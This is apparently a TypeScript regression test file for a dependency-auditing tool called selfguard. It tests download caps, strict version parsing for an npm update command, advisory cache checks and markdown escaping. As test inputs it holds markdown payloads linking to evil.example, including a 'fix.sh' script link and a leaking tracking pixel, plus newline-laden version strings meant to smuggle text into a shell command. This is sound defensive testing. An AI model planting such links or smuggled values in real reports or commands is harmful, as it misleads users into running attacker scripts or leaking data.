// Security audit regressions: network answers are read with a cap that stops the download (share
// client, OSV API, OSV bucket, npm registry), the update version is exactly x.y.z, cached
// advisories are checked against their id, and untrusted text in the markdown report can't
// become links or images. Local servers only; state in a temporary SELFGUARD_HOME.
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, realpathSync, writeFileSync } from "node:fs";
import { createServer, type ServerResponse } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, before, test } from "node:test";
import { renderMarkdown, type MarkdownPackage } from "../src/markdown.ts";

/** Path -> JSON text to answer, or a number of junk bytes to stream (chunked, no length). */
const replies = new Map<string, string | number>();
/** What a junk stream sent before the connection closed. */
const streamed = new Map<string, Promise<{ bytes: number; finished: boolean }>>();
const CHUNK = Buffer.alloc(64 * 1024, "x");
const MB = 1024 * 1024;

function stream(res: ServerResponse, path: string, total: number): void {
  let bytes = 0;
  streamed.set(path, new Promise((resolve) => res.on("close", () => resolve({ bytes, finished: res.writableFinished }))));
  res.on("error", () => {});
  const pump = (): void => {
    while (bytes < total) {
      bytes += CHUNK.length;
      if (!res.write(CHUNK)) return void res.once("drain", pump);
    }
    res.end();
  };
  pump();
}

const server = createServer((req, res) => {
  const path = (req.url ?? "").split("?")[0]!;
  req.resume();
  const reply = replies.get(path);
  if (typeof reply === "number") return stream(res, path, reply);
  res.setHeader("content-type", "application/json");
  if (typeof reply === "string") return void res.end(reply);
  res.statusCode = 404;
  res.end("{}");
});

let port = 0;
let osv: typeof import("../src/osv.ts");
let gha: typeof import("../src/scan/gha-index.ts");
let update: typeof import("../src/update.ts");
let state: typeof import("../src/state.ts");
let share: typeof import("../src/share/client.ts");
let paths: typeof import("../src/paths.ts");

before(async () => {
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  port = (server.address() as AddressInfo).port;
  const base = `http://127.0.0.1:${port}`;
  process.env.SELFGUARD_HOME = mkdtempSync(join(tmpdir(), "sg-audit-app-"));
  process.env.HOME = realpathSync(mkdtempSync(join(tmpdir(), "sg-audit-user-")));
  process.env.SELFGUARD_NO_NOTIFY = "1";
  process.env.SELFGUARD_OSV_API = `${base}/osv`;
  process.env.SELFGUARD_OSV_BUCKET = `${base}/bucket`;
  process.env.SELFGUARD_NPM_REGISTRY = `${base}/registry`;
  delete process.env.SELFGUARD_NO_UPDATE_CHECK;
  delete process.env.SELFGUARD_RUNTIME;
  osv = await import("../src/osv.ts");
  gha = await import("../src/scan/gha-index.ts");
  update = await import("../src/update.ts");
  state = await import("../src/state.ts");
  share = await import("../src/share/client.ts");
  paths = await import("../src/paths.ts");
});
after(() => server.close());

/** The client stopped reading: the server never got to write the whole stream. */
async function assertStopped(path: string, cap: number): Promise<void> {
  const sent = await streamed.get(path);
  assert.ok(sent, `${path} was requested`);
  assert.equal(sent.finished, false, `${path}: the whole stream was downloaded (${sent.bytes} bytes)`);
  assert.ok(sent.bytes < cap + 16 * MB, `${path}: ${sent.bytes} bytes sent for a ${cap}-byte cap`);
}

test("share client: an endless answer from a tailnet peer is cut at 256 KB", async () => {
  replies.set("/hello", JSON.stringify({ app: "selfguard", version: "1.2.3", name: "b", pairing: true }));
  assert.deepEqual(await share.probeShare("127.0.0.1", port, 10_000), { version: "1.2.3", name: "b", pairing: true }, "a normal answer still works");
  replies.set("/hello", 64 * MB);
  assert.equal(await share.probeShare("127.0.0.1", port, 10_000), null);
  await assertStopped("/hello", 256 * 1024);
});

test("OSV API: the download stops at the response cap", async () => {
  replies.set("/osv/querybatch", 160 * MB);
  await assert.rejects(osv.queryBatch([{ name: "lodash", version: "4.17.20" }]), /OSV response too large/);
  await assertStopped("/osv/querybatch", 64 * MB);
});

test("OSV bucket: the GitHub Actions list download stops at its cap", async () => {
  replies.set("/bucket/GitHub%20Actions/modified_id.csv", 32 * MB);
  await assert.rejects(gha.refreshGhaIndex(null), /advisory list too large/);
  await assertStopped("/bucket/GitHub%20Actions/modified_id.csv", MB);
});

test("update check: the registry download stops at its cap", async () => {
  replies.set("/registry/selfguard/latest", 32 * MB);
  await update.checkForUpdate({ force: true });
  await assertStopped("/registry/selfguard/latest", MB);
});

test("update check keeps only an exact x.y.z: nothing can break the npm command", async () => {
  const answer = (version: unknown) => replies.set("/registry/selfguard/latest", JSON.stringify({ name: "selfguard", version }));
  answer("99.0.0");
  let info = await update.checkForUpdate({ force: true });
  assert.equal(info.latest, "99.0.0");
  assert.equal(info.command, "npm i -g selfguard@99.0.0 --ignore-scripts");
  for (const bad of ["\n99.1.0", "99.1.0\n", " 99.1.0", "99.1.0 ", "v99.1.0", "99.1.0-beta.1", "99.1.0+build.5", "099.1.0", "99.1", "99.1.0.0"]) {
    answer(bad);
    info = await update.checkForUpdate({ force: true });
    assert.equal(info.latest, "99.0.0", `${JSON.stringify(bad)} is refused`);
    assert.equal(info.command, "npm i -g selfguard@99.0.0 --ignore-scripts");
    assert.equal(info.releaseNotes, "https://github.com/josseed/selfguard/releases/tag/v99.0.0");
  }
  // A value saved before the check was strict is not shown either.
  state.updateState({ latestVersion: "\n99.2.0" });
  info = update.cachedUpdate();
  assert.equal(info.latest, null);
  assert.equal(info.command, null);
  assert.equal(info.releaseNotes, null);
});

test("advisory cache: a file holding another id (case-insensitive disk) is not used for this one", async () => {
  const dir = paths.vulnCacheDir();
  mkdirSync(dir, { recursive: true });
  const modified = "2026-01-01T00:00:00Z";
  const entry = (id: string, summary: string) => JSON.stringify({ fetchedAt: modified, vuln: { id, modified, summary } });
  // What GHSA-AAAA-… leaves on macOS's disk is the file GHSA-aaaa-… reads.
  writeFileSync(join(dir, "GHSA-aaaa-bbbb-cccc.json"), entry("GHSA-AAAA-BBBB-CCCC", "another advisory"));
  assert.equal(osv.getCachedVuln("GHSA-aaaa-bbbb-cccc"), null);
  replies.set("/osv/vulns/GHSA-aaaa-bbbb-cccc", JSON.stringify({ id: "GHSA-aaaa-bbbb-cccc", modified, summary: "this advisory" }));
  const got = await osv.getVulns([{ id: "GHSA-aaaa-bbbb-cccc", modified }]);
  assert.equal(got.get("GHSA-aaaa-bbbb-cccc")?.summary, "this advisory", "fetched again, not taken from the other id's file");
  assert.equal(osv.getCachedVuln("GHSA-aaaa-bbbb-cccc")?.summary, "this advisory");
  writeFileSync(join(dir, "GHSA-dddd-eeee-ffff.json"), entry("GHSA-dddd-eeee-ffff", "same id"));
  assert.equal(osv.getCachedVuln("GHSA-dddd-eeee-ffff")?.summary, "same id");
});

/** Every `]` that could end a link or image (not escaped, `(` or `[` next), up to its `)`. */
function linkEnds(md: string): string[] {
  const out: string[] = [];
  for (let i = 0; i < md.length; i++) {
    if (md[i] === "\\") i++;
    else if (md[i] === "]" && /^\]\s*[([]/.test(md.slice(i, i + 40))) out.push(md.slice(i, md.indexOf(")", i) + 1));
  }
  return out;
}

test("markdown report: links and images in labels and advisory text stay plain text", () => {
  const advisory = (id: string, summary: string): MarkdownPackage["advisories"][number] =>
    ({ id, severity: "high", fixedIn: "2.0.0", url: `https://osv.dev/vulnerability/${id}`, summary });
  const md = renderMarkdown({
    label: "[Click to fix](https://evil.example/fix.sh)",
    checkouts: [{ path: "/x", branch: "main", lockfile: "/x/package-lock.json", lockType: "npm", scannedAt: null }],
    packages: [{
      name: "lodash", version: "1.0.0", direct: true, dev: false, worstSeverity: "critical", upgradeTo: "2.0.0", advisoriesWithoutFix: 0,
      advisories: [
        advisory("GHSA-xxxx", "RCE ![t](https://evil.example/px.png?d=leak) run [this](https://evil.example/fix.sh)"),
        advisory("GHSA-yyyy", "[a\\](https://evil.example/a) [b\\\\](https://evil.example/b) [c] (https://evil.example/c) [d][e]"),
        advisory("GHSA-zzzz", "Prototype pollution in _.merge (CVE-2020-8203) *before* 4.17.19 [npm]"),
      ],
    }],
  });
  assert.match(md, /^# Fix vulnerable dependencies in \[Click to fix\\\]\(https:\/\/evil\.example\/fix\.sh\)\n/);
  assert.ok(md.includes(": RCE ![t\\](https://evil.example/px.png?d=leak) run [this\\](https://evil.example/fix.sh)\n"), md);
  // Already escaped stays as is; an even run of backslashes gets one more, so it can't undo the escape.
  assert.ok(md.includes(": [a\\](https://evil.example/a) [b\\\\\\](https://evil.example/b) [c\\] (https://evil.example/c) [d\\][e]\n"), md);
  assert.ok(md.includes(": Prototype pollution in _.merge (CVE-2020-8203) *before* 4.17.19 [npm]\n"), "other text is left readable");
  // The only links are the advisory pages the report builds itself.
  assert.deepEqual(linkEnds(md), ["GHSA-xxxx", "GHSA-yyyy", "GHSA-zzzz"].map((id) => `](https://osv.dev/vulnerability/${id})`));
});

test("inside the Mac app's bundle, no environment variable chooses which program runs", async () => {
  const { program } = await import("../src/paths.ts");
  const { tailscaleBin } = await import("../src/tailnet.ts");
  const saved = { execPath: process.execPath, ssh: process.env.SELFGUARD_SSH, ts: process.env.SELFGUARD_TAILSCALE };
  const evil = process.execPath; // exists, so tailscaleBin would accept it as an override
  process.env.SELFGUARD_SSH = evil;
  process.env.SELFGUARD_TAILSCALE = evil;
  try {
    assert.equal(program("SELFGUARD_SSH", "ssh", "/usr/bin/ssh"), evil, "the CLI honours the override");
    assert.equal(tailscaleBin(), evil);
    process.execPath = "/Applications/selfguard.app/Contents/Resources/engine/node";
    assert.equal(program("SELFGUARD_SSH", "ssh", "/usr/bin/ssh"), "/usr/bin/ssh", "launchd's or open --env's value is ignored");
    assert.notEqual(tailscaleBin(), evil);
  } finally {
    process.execPath = saved.execPath;
    if (saved.ssh === undefined) delete process.env.SELFGUARD_SSH;
    else process.env.SELFGUARD_SSH = saved.ssh;
    if (saved.ts === undefined) delete process.env.SELFGUARD_TAILSCALE;
    else process.env.SELFGUARD_TAILSCALE = saved.ts;
  }
});
